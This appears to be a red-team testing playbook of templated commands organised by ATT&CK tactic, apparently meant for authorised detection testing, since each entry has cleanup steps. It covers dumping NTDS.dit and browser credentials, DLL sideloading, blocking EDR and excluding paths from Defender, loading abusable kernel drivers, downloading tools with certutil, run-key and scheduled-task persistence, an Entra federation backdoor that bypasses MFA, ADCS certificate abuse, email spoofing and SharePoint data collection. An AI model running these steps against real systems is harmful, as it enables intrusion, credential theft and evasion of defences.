# Privilege Escalation

## SCCM - register device via SharpSCCM.exe

Register a new device in SCCM using credentials for a machine account using SharpSCCM (https://github.com/Mayyhem/SharpSCCM)

### Prerequisites

- Machine account and credentials
- SharpSCCM, compiled

### Guidance

```
cmd> SharpSCCM.exe new device -n {{ device_name }} -u {{ machine_account_name }} -p {{ machine_account_password }}
```

### Cleanup

```
cmd> SharpSCCM.exe remove device {{  device_guid }}
```

# Credential Access

## Extract NTDS.dit Credentials - via existing shadow (PowerShell script)

Copy the required NTDS files from an existing shadow(s) without having the physical paths in the command

### Prerequisites

- Elevated (high integrity) command execution on a DC
- Sufficient free disk space on the DC (verify size of ntds.dit file against free disk space)
- If there are no shadows containing the the appropriate SYSTEM and NTDS.dit files, create them
  - for example `vssadmin create shadow /for=c: {{ drive_letter }}` and `wmic shadowcopy call create Volume="{{ drive_letter }}` can be used
  - Note: sometimes the NTDS is installed on a different drive from the Windows install
    - for such cases, locate the drive containing the NTDS.dit file via `reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters` then create a shadow for that drive
- Extraction script (https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ntdscopy.ps1)
    - If the NTDS file is using a nonstandard path, change the relevant section in the script (`$ditpath = ...`)

### Guidance

```
PS> mkdir {{ outdir }}
PS> .\ntdscopy.ps1 {{ sys_shadow_number }} {{ ntds_shadow_number }} {{ outdir }}
```

- `sys_shadow_number` is the number appended to the Shadow Copy Volume Name of the shadow containing the SYSTEM registry
- `ntds_shadow_number` is the number appended to the Shadow Copy Volume Name of the shadow containing the NTDS.dit
  - For example: Given `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`, `sys_shadow_number` and/or `ntds_shadow_number` would be 1
- This script will create two files in the `{{ outdir }}`, one and two

### Cleanup

Delete the newly created files and `{{ outdir }}`:

```
cmd> rmdir /S /Q {{ outdir }}
```

If shadows were created as part of the setup, delete them as well

## Browser credential dumping - Chromium-based via ChromeElevator

https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption

### Prerequisites

- ChromeElevator, compiled

### Guidance

To dump cookies, use

```
cmd> chromelevator.exe {{ browser }}
```

- where `browser` is one of `chrome`, `brave`, `edge`, `all`

### Cleanup

- Delete all output files from disk 

# Execution

## msiexec - Exe Loader

https://attack.mitre.org/techniques/T1218/007/

Use msiexec to execute an executable embedded inside an MSI

### Prerequisites

1. An executable payload
2. An MSI payload
   1. For making from scratch: https://www.advancedinstaller.com/download.html
   2. Premade: https://github.com/redcanaryco/AtomicTestHarnesses/tree/master/Windows/TestHarnesses/T1218.007_Msiexec

### Guidance

```
cmd> msiexec.exe /q /i {{ msi }}
```

### Notes

Some important features of the MSI are:

1. package architecture should match executable architecture
2. should be a user installer to avoid elevation requests and should avoid modifying non-user paths/Registry settings
3. use basic installation prompts for compatibility with "/q" (quiet) installation
4. executable payload should be embedded inside the MSI
5. MSI does not need to be registered with control panel and execution should occur on installation only to avoid multiple executions

### Cleanup

If the MSI was configured to register with the Control Panel, make sure it is properly uninstalled after completion

## DLL Search Order Hijacking - MpCmdRun.exe sideloading

MpCmdRun.exe is susceptible to a DLL sideloading hijack via its dependency on MpClient.dll

### Prerequisites

- A DLL with the appropriate exports called `mpclient.dll`
  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload (`payload.cpp` and `mpclient.def`)

### Guidance

Copy `c:\program files\windows defender\mpcmdrun.exe` to the same directory as the `mpclient.dll` payload then run `mpcmdrun.exe`

## DLL Search Order Hijacking - Certutil.exe sideloading

Additional executables potentially also vulnerable (refer to https://hijacklibs.net/entries/microsoft/built-in/netapi32.html).

### Prerequisites

- A DLL with the appropriate exports called `netapi32.dll`
  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload (`payload.cpp` and `netapi32.def`)

### Guidance

Copy `C:\windows\system32\certutil.exe` to the same directory as the `netapi32.dll` payload then run `certutil.exe`

### Notes

`PsExec64.exe (EDFAE1A69522F87B12C6DAC3225D930E4848832E3C551EE1E7D31736BF4525EF)` is also susceptible to search order hijacking via the same `netapi32.dll` and can be used instead of `certutil.exe`

## DLL Side Loading - General guidance

### Notes

- For a list of side-loadable DLLs, refer to https://hijacklibs.net/

# Defense Evasion

## EDR network tampering - via netsh

Create a firewall rule to block outbound traffic originating from EDR tool processes, preventing agents from sending data to their control plane

### Prerequisites

- Local admin

### Guidance

```
cmd> netsh advfirewall firewall add rule name="{{ rule_name }}" dir=out action=block program="{{ edr_file_path }}"
```

### Cleanup

```
cmd> netsh advfirewall firewall delete rule name="{{ rule_name }}"
```

## Manage Windows Firewall - disable via netsh.exe

### Prerequisites

- Local admin

### Guidance

Retrieve the current state of profiles

```
cmd> netsh advfirewall show allprofiles state 
```

Disable all network profiles

```
cmd> netsh advfirewall set allprofiles state off
```

### Cleanup

Re-Enable all network profiles

```
cmd> netsh advfirewall set allprofiles state on
```

or enable individually 

```
cmd> netsh advfirewall set {{ profile }} state on
```

- where profile is one of `domainprofile` / `privateprofile` / `publicprofile`

## Manage Windows Defender AV - exclusion via Set-MpPreference

Disable Defender, the builtin AV in Windows

### Prerequisites

- Local admin

### Guidance

From an elevated PowerShell terminal:

```
PS> Set-MpPreference -ExclusionPath "{{ folder }}"
```

Alternatively, directly invoke the `Add` method from the `MSFT_MpPreference` class using `Invoke-CimMethod`

```
PS> Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath=@("C:\path\to\exclude"); Force=$true}
```

### Cleanup

```
PS> Remove-MpPreference -ExclusionPath "{{ folder }}"
```

### References

- https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions

## Malicious kernel driver use - load known-abusable driver

Kernel drivers can be used by attackers for a number of malicious activities, including hiding artifacts and tampering with endpoint security tools.

This bypasses the need for attackers to retrieve legitimate code-signing certificates for a driver they wrote.

### Prerequisites

- Local admin
- A known-abusable driver. Examples:
  - **ProcExp (SHA256 - 075de997497262a9d105afeadaaefc6348b25ce0e0126505c24aa9396c251e85)**
  - DBUtil_2_3 (SHA256 - 0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5)
  - RTCore64 (SHA256 - 01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd)
  - IQVM64 (SHA256 - 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b)

### Guidance

Example loading using sc.exe

```
cmd> sc.exe create {{ name }} type= kernel start= demand error= normal binpath= c:\windows\System32\Drivers\{{ sys_file }} displayname= {{ name }}
```

You can verify that the driver loaded by using [WinObj](https://learn.microsoft.com/en-us/sysinternals/downloads/winobj) from SysInternals (listed under Global??).

### Cleanup

- If using sc.exe, stop and delete the service then restart the machine and delete the driver file

### Notes

Drivers can be found in multiple places, including:

- Directly from vendor sites
- VirusTotal
- Aggregators like LOLDrivers and KDU
  - LOLDrivers: https://github.com/magicsword-io/LOLDrivers/tree/main/drivers
  - KDU: https://github.com/hfiref0x/KDU/

# Command and Control

## Remote assistance software - General guidance

Select and use a well-known remote assistance software

### Prerequisites

- A tool(s) from the list below, or any other widely used remote assistance tool:
   1. TeamViewer: https://www.teamviewer.com/
   2. AnyDesk: https://anydesk.com/en
   3. GoTo Resolve: https://www.goto.com/it-management/resolve
   4. ConnectWise Control: https://control.connectwise.com/
- Any tool-specific requirements
   1. An account for the service
   2. The service's installer or its portable edition

### Notes

- Where possible, use remote assistance software already in use in the environment

## Remote tool download - General guidance

Transfer tool into environment by downloading from the Internet

### Guidance

Example download methods:

via web browser

```
Open browser > navigate to {{ url }}
```

via `curl`

```
shell> curl -fsSL -O {{ url }}
```

via PowerShell (`DownloadFile` method)

```
PS> (new-object System.Net.WebClient).DownloadFile('{{ url }}')
```

via `certutil` (`urlcache` method)

```
cmd> certutil.exe -urlcache -split -f {{ url }}
```

### Notes

- The maliciousness level of the binary should align with the intent of the test. For testing signature-based checks, use a known malicious tool, such as Mimikatz. For testing sandboxing or similar network security technologies, use an unknown yet still overtly malicious tool, such as one built around the current attack infrastructure. By default, start with the most malicious choice.

# Lateral Movement

## Windows Authentication Coercion - General guidance

https://github.com/p0dalirius/Coercer/

### Prerequisites

- [Coercer](https://github.com/p0dalirius/Coercer/) setup in a virtualenv
- Domain user credentials
- A target RPC interface, such as MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-DFSNM (DFSCoerce), or MS-FSRVP (ShadowCoerce)
    - Use Coercer's scan mode to identity valid interface/method combinations (`python Coercer.py scan --target {{ target }} ...`)
- A listener (e.g. `ntlmrelayx`, `responder`)

### Guidance

To trigger the coercion:

```
shell> python Coercer.py coerce -u {{ domain_user }} -p {{ password }} --target-ip {{ target }} -l {{ listener }} --filter-protocol-name {{ rpc_protocol }} --filter-method-name {{ rpc_method }}
```

- `rpc_protocol` and `rpc_method` can be determined from the output of the `scan` sub-command.
- If authenticating with a hash instead of a password, use `--hashes {{ lm:nt }}` instead of `-p {{ password }}`

### Notes

Different RPC interfaces may have individual tools to coerce authentication. For example:
- MS-RPRN: https://github.com/leechristensen/SpoolSample
- MS-EFSR: https://github.com/topotam/PetitPotam
- MS-DFSNM: https://github.com/Wh04m1001/DFSCoerce
- MS-FSRVP: https://github.com/ShutdownRepo/ShadowCoerce

# Exfiltration

## Exfiltration to cloud storage - General guidance

Select and use a well-known cloud storage service

### Prerequisites

1. An account for the service
2. Tool client downloaded and installed
   1. Generic: https://rclone.org/downloads/
   2. MEGA: https://mega.io/desktop
   3. Dropbox: https://www.dropbox.com/install

### Notes

- Where possible, use cloud storage service already in use in the environment

# Persistence

## Registry Run Key Persistence - via reg.exe

Use built-in reg.exe to persist via the Registry by setting a command to be run on user login

### Guidance

```
CMD> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{{ key_name }}" /t REG_SZ /F /D "{{ command }}"
```

Verify creation with the following command:

```
CMD> reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{{ key_name }}"
```

### Cleanup

```
CMD> reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /F /V "{{ key_name }}"
```

## Azure AD Domain Federation - Backdoor via PowerShell

Use AADInternals (or Graph PowerShell) to create a backdoor federation domain for persisting access to an environment.

### Prerequisites

- AADInternals installed
  - `Install-Module AADInternals`
- Permissions to modify domain authentication settings
  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
- A target verified domain in Azure AD
  - To add a domain, Go to Azure AD -> custom domain names -> add -> set the provided DNS records for your domain -> wait for the verification to compelete
- A user with an immutable ID set
  - To set an immutable ID for a user: `Set-AADIntUser -UserPrincipalName {{ upn_or_email }} -ImmutableId "{{ id }}" -AccessToken $at` where the `id` is an arbitrary unnique value

### Guidance

To set the backdoor

```
PS> ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "{{ domain }}"
```

Optionally, to use the backdoor:

```
Open-AADIntOffice365Portal -ImmutableID {{ id }} -UseBuiltInCertificate -ByPassMFA $true -Issuer {{ issuer }}
```

- `id` is the immutable ID of the target user
- `issuer` is the IssuerUri provided in the output of the previous command 

This works for any user in the tenant, regardless of their domain.

Alternatively, you can configure the domain federation via the [Graph PowerShell modules](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0). First, install via `Install-Module Microsoft.Graph`. Then:

```
Connect-MgGraph -Identity  
$FedDomain = '{{ domain }}'
$UniqueID = '{0:X}' -f (Get-Date).GetHashCode()
$LogOnOffUri='https://any.sts/'+$UniqueID+'/'
$IssuerUri='http://any.sts/'+$UniqueID+'/'
openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -sha256 -days 365
$certContent = Get-Content -Path cert.pem -Raw
$cleanedCertContent = $certContent -replace '&#x2D;&#x2D;&#x2D;&#x2D;&#x2D;BEGIN CERTIFICATE&#x2D;&#x2D;&#x2D;&#x2D;&#x2D;', '' -replace '&#x2D;&#x2D;&#x2D;&#x2D;&#x2D;END CERTIFICATE&#x2D;&#x2D;&#x2D;&#x2D;&#x2D;', '' -replace '\r?\n', ''
New-MgDomainFederationConfiguration -DomainId $FedDomain -ActiveSignInUri $LogOnOffUri -DisplayName $FedDomain -IssuerUri $IssuerUri -PassiveSignInUri $LogOnOffUri -SignOutUri $LogOnOffUri -FederatedIdpMfaBehavior "acceptIfMfaDoneByFederatedIdp" -SigningCertificate $cleanedCertContent
```

- `any.sts` is the domain used by AADInternals. Refer to AADInternals [source code](https://github.com/Gerenios/AADInternals/blob/master/FederatedIdentityTools.ps1) for details.
- Sometimes the output results in a internal error. If this happens, first verify the status of the domain as it may still have converted properly.
- If you are getting an `Insufficient privileges to complete the operation` error when updating the domain's configuration using Graph PowerShell, try updating the connect command to `Connect-MgGraph -Scopes 'Directory.AccessAsUser.All'`

### Cleanup

- Delete the domain
- The domain may also appear in the Defender for Cloud Apps managed domains list. To remove, go to the Microsoft security console (security.microsoft.com) -> Settings -> Cloud Apps -> Organization details -> Managed domains -> remove the domain from the domain list -> Save

### Notes

- The domain must be verified for the backdoor to work

### References

- https://o365blog.com/post/aadbackdoor/
- https://www.mandiant.com/resources/blog/detecting-microsoft-365-azure-active-directory-backdoors

## Active Directory Certificate Services - Certificate creation via Certify

PKI infrastructure services for Active Directory

https://github.com/GhostPack/Certify

### Prerequisites

- A domain user account and a domain-joined system
- ADCS running in domain and a valid target template; can identify using Certify: `Certify.exe find /clientauth`
- Local Administrator (if requesting a machine account certificate)
- Certify (https://github.com/GhostPack/Certify), compiled
    - Using Visual Studio: -> load solution (.sln) file -> set to "Release" -> build. Note: make sure that nuget.org is added as a NuGet Packgage Source (Tools -> NuGet Package Manager -> Package Manager Settings -> Package Sources -> Click "+" -> Put "https://api.nuget.org/v3/index.json" in the Source field)

### Guidance

Enumerate available templates on the domain

```
CMD> Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins
```

For User certificate enrollment:
- `Manager Approval Required` is `False`
- `Authorized Signatures Required` is `0`
- `Extended Key Usage` includes `Client Authentication`
- `Enrollment Rights` includes `{{ domain }}\Domain Users`

For Machine account certificate enrollment:
- `Manager Approval Required` is `False`
- `Authorized Signatures Required` is `0`
- `Extended Key Usage` includes `Client Authentication`
- `Enrollment Rights` includes `{{ domain }}\Computers`

Once a template has been identified, run either of the following commands

For User account certificate enrollment:
```
CMD> Certify.exe request --ca {{ adcs_ca }} --template {{ cert_template }}
```

For Computer account certificate enrollment (requires High Integrity process):
```
CMD> Certify.exe request --ca {{ adcs_ca }} --template {{ cert_template }} --machine
```

Certify will default to requesting a certificate for the current user based on the user context. 
If you are in a netonly runas (or something similar), add the following option, replacing the variable with the 
distinguished name of the runas user:

> /subject:"{{ distinguished_name }}"

Bonus: using the certificate to request Kerberos TGT after converting to a PFX

```
CMD> Rubeus.exe asktgt /user:{{ user }} /certificate:{{ cert_file }} /password:{{ cert_password }}
```

### Cleanup

- Open the "Certification Authority" GUI application on an AD CS server -> Expand the CA the certificate(s) was created within, then click "Issued Certificates" -> Find the certificate, right-click -> All Tasks -> Revoke Certificate
  - You must wait until the CRL refresh interval for this to take effect. Alternatively you can publish a new CRL after revoking the certificate via the ADCS server then force a CRL update on the KDCs for this to take effect immediately.
  - An account with the `Issue and Manage Certificates` (allows the account to issue, revoke, and manage certificates) is required to revoke the newly issued certificates

### Notes

- Tool has issues running on non-domain-joined systems

## Persistence in Entra ID - Register a New Device

Register a new device in Entra ID

### Prerequisites

- Entra ID credentials
- AAD Internals PowerShell module (https://aadinternals.com/aadinternals/#installation)
  - Install: `PS> install-module aadinternals -scope currentuser`
  - Import: `PS> import-module aadinternals`

### Guidance

Authenticate to Entra ID and save the token

```
PS> Get-AADIntAccessTokenForAADJoin -SaveToCache
```

Register a device: 

```
PS> Join-DeviceToAzureAD -DeviceName "{{ device_name }}" -DeviceType "{{ device_type }}" -OSVersion "{{ os_version }}" -JoinType Register
```

  - This will save a `.pfx` certificate to the current working directory, which is needed for cleanup
  - Note: The provided values do not need to refer to real characteristics

### Cleanup

Remove the device from Entra ID

```
PS> Remove-AADIntDeviceFromAzureAD -PfxFileName {{ pfx_certificate_file }}
```

## Entra OAuth Application - New credential for Entra OAuth application via CLI

Add credentials to an Entra OAuth application via the Azure CLI

### Prerequisites

- An Enterprise Entra ID application
- Azure CLI installed

### Guidance

```
shell> az ad app credential reset --id {{ app_id }} --append
```

### Cleanup

Delete the client secret

```
shell> az ad app credential delete --id {{ app_id }} --key-id {{ key_id }}
```

- the `key_id` will be returned when the credential is generated

## Scheduled Task Persistence - via schtasks.exe

Use built-in schtasks.exe to persist by creating a scheduled task

### Guidance

```
CMD> schtasks /Create /SC DAILY /TN "{{ taskname }}" /TR "{{ command }}" /ST 09:00
```

Verify creation with the following command:

```
CMD> schtasks /query /TN {{ taskname }} 
```

### Cleanup

```
CMD> schtasks /delete /tn "{{ taskname }}" /f
```

## Active Directory Machine Account - Creation via Sharpmad

Active Directory machine account creation

https://github.com/Kevin-Robertson/Sharpmad

### Prerequisites

- Domain user account
- Domain MachineAccountQuota is greater than 0
  - Check using PowerShell AD: `Get-ADDomain | Get-ADObject -Properties ms-ds-machineaccountquota`
- Sharpmad, compiled 

### Guidance

```
cmd> Sharpmad.exe MAQ -Action new -MachineAccount {{ machine_account_name }} -MachinePassword {{ machine_account_password }}'
```

- Can alternatively use the "-Random" flag instead of specifying machine account details

### Cleanup

Machine account can only be deleted by privileged AD users

### Notes

- PowerShell version: https://github.com/Kevin-Robertson/Powermad
- Sharpmad may produce the following generic error if the user does not have permissions to create a machine account: `The object does not exist`. You can confirm by using Impacket's `addcomputer.py` script to create a machine account. If the user does not have the appropriate permissions, it will return the error `User <user> doesn't have right to create a machine account!`.

# Initial Access

## Known malicious link - URLHaus tagged link

Retrieve and send a known-malicious link from URLHaus that is currently online

### Prerequisites

- Retrieve link from URLHaus CSV export

```
bash> 
tmpd=$(mktemp -d)
zipf="$tmpd/csv.zip"
curl -LsSo $zipf https://urlhaus.abuse.ch/downloads/csv/
unzip $zipf -d $tmpd > /dev/null
grep -ir --include "*.txt" "online.*emotet" $tmpd | grep -oP "http.*?\"" | grep -v "https://urlhaus.abuse.ch" | shuf
rm -rf $tmpd
```

Note: this example looks for links tagged "emotet" but this can be changed as needed (https://urlhaus.abuse.ch/browse/)

## Email Spoofing - Spoof email by sending directly to tenant SMTP endpoint

Email filtering can potentially be bypassed in misconfigured tenants through spoofing an internal email by sending an email directly to the direct send domain.

Send an email to a target that spoofs the sender's address to look like an internal user by using the target tenant's Exchange Online SMTP endpoint.

### Prerequisites

- The SMTP tenant FQDN for the target domain

### Guidance

Via Powershell:

```
PS> Send-MailMessage -SmtpServer {{ tenant_fqdn }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ rcpt }} -From {{ sender }} -Attachments {{ attachment }}
```

Via Swaks:

```
shell> swaks --server {{ tenant_fqdn }} --to {{ user }}@{{ email_domain }} --from {{ user }}@{{ email_domain }}
```

### Notes

If you have authenticated access to manage Exchange Online, you can use the PowerShell cmdlets or the Admin console to retrieve the tenant FQDN.

Using PowerShell: `Get-MxRecordReport -Domain {{ domain }}` -> `HighestPriorityMailHost` property

Using the console: https://admin.microsoft.com/#/Domains -> select the domain -> DNS records -> MX record.

See https://learn.microsoft.com/en-us/Exchange/mail-flow-best-practices/how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365?redirectSourcePath=%252fen-us%252farticle%252fHow-to-set-up-a-multifunction-device-or-application-to-send-email-using-Office-365-69f58e99-c550-4274-ad18-c805d654b4c4#appendix-find-the-mx-record-for-the-chosen-accepted-domain-in-microsoft-365-or-office-365

If you do not have Exchange access, you can attempt to retrieve the tenant FQDN by querying the MX records for the domain.
If the domain uses a third-party mail service, you can attempt to guess the FQDN as it follows the format:
`<tenant-part>.mail.protection.outlook.com`, where `<tenant-part>` is the domain name with `.`s replaced with `-`s. 
For example, `example.com` becomes `example-com.mail.protection.outlook.com`.

You may receive an SMTP 550 error because of additional restriction on the tenant. 
To bypass, you can potentially use another tenant's SMTP server as the sender.

### References

- https://und3rf10w.blogspot.com/2017/07/abusing-misconfigured-cloud-email.html
- https://gsec.hitb.org/sg2018/sessions/traversing-the-kill-chain-the-new-shiny-in-2018/
- https://www.blackhillsinfosec.com/spoofing-microsoft-365-like-its-1995/

## Teams phishing - General guidance

### Prerequisites

- Enterprise Teams tenant (separate from target user's tenant)
- You can optionally use TeamsEnum (https://github.com/sse-secure-systems/TeamsEnum) to determine if the tenant allows messages from external tenants
    - `python TeamsEnum.py -e {{ target_email }} ...`

### Guidance

Send a Teams message to a target user from a user in another enterprise tenant.
When searching for an external user in the Teams app, if the target tenant disallows external communications, the user will not be located.

## Authentication via device code flow - Initiating via PowerShell

Initiate a device code flow from via PowerShell

### Guidance

Save the below PowerShell script to a file then execute it directly/via the ISE.

```
$ClientID = '1950a258-227b-4e31-a9cf-717495945fc2'
$TenantID = 'common'
$Resource = "https://graph.microsoft.com/"

$DeviceCodeRequestParams = @{
    Method = 'POST'
    Uri    = "https://login.microsoftonline.com/$TenantID/oauth2/devicecode"
    Body   = @{
        client_id = $ClientId
        resource  = $Resource
    }
}

$DeviceCodeRequest = Invoke-RestMethod @DeviceCodeRequestParams
Write-Host $DeviceCodeRequest.message -ForegroundColor Yellow
```

Note: This is the bare minimum required to perform the code flow and will not retrieve the token from the flow.

### References

- https://blog.simonw.se/getting-an-access-token-for-azuread-using-powershell-and-device-login-flow/#starting-a-device-login-flow

## Suspicious connections - General guidance

### Guidance

When using a browser, you can override the user agent string by using an extension. For example:

- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg

You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.

## Known malicious link - QR code generation

Generate a QR code for a known-malicious link

### Prerequisites

- QR encode utility (https://fukuchi.org/works/qrencode/)
  - If on Debian/Ubuntu, you can install from a package manager using the package `qrencode` (i.e. `apt install qrencode`)

### Guidance

To generate a QR code:

```
shell> qrencode -o {{ outfile }} {{ link }}
```

# Collection

## Collection from SharePoint - Accessing SharePoint via GraphSpy

https://github.com/RedByte1337/GraphSpy

### Prerequisites

- GraphSpy installed in a virtualenv and running
- An access token with the `Sites.Read.All` permission
  - Import the GraphSpy and set as the active token

### Guidance

To search SharePoint:

- In GraphSpy -> Custom -> Generic MSGraph Search -> Search type = "driveItem"

To download from SharePoint:

- From any of the pages that return file listings (e.g. SharePoint -> Files, Custom Search), you can download the file via the download button in the results list

### Notes

If you are using [roadtx](https://github.com/dirkjanm/ROADtools) to retrieve tokens, you can use the getscope command to find clients with the appropriate scope. 
`roadtx getscope -s Sites.Read.All` will find clients that can read from SharePoint/Drive, such as `d326c1ce-6cc6-4de2-bebc-4591e5e13ef0` (SharePoint).

This client is also FOCI-compatible, so you can use a refresh token to mint an access token (e.g. `roadtx refreshtokento --tokens-stdout -s https://graph.microsoft.com/Sites.Read.All -c d326c1ce-6cc6-4de2-bebc-4591e5e13ef0`).

## Collection from SharePoint - Accessing SharePoint via GraphRunner

https://github.com/dafthack/GraphRunner

### Prerequisites

- GraphRunner is downloaded and imported (`Import-Module .\GraphRunner.ps1`)
- An access token with the `Sites.Read.All` permission
  - You can use the GraphRunner cmdlet, `Get-GraphTokens`, to perform a device-code login. This will also store the retrieved tokens in a `$tokens` variable.

### Guidance

To search SharePoint:

```
PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "{{ search_term }}"
```

- When complete, this command will also prompt to download one or more items

You can alternatively download files individually using

```
PS> Invoke-DriveFileDownload -Tokens $tokens -FileName "{{ destination }}" -DriveItemIDs "{{ drive_item_id }}"
```

- `drive_item_id` is returned in the search output

